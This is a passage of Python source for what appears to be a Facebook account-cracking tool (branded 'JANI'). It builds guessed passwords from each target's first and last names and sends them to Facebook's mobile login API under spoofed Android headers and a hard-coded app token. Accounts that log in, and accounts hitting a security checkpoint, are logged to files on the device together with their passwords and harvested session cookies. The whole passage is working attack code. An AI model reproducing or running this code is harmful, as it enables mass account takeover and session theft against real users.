'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[JANI-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/JANI_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/JANI_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[JANI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/JANI_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method2(uid,nm,pwx)

		
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [JANI] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[JANI-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/JANI_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/JANI_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[JANI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/JANI_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method3(uid,nm,pwx)
if __name__=="__main__":
	Main().menu()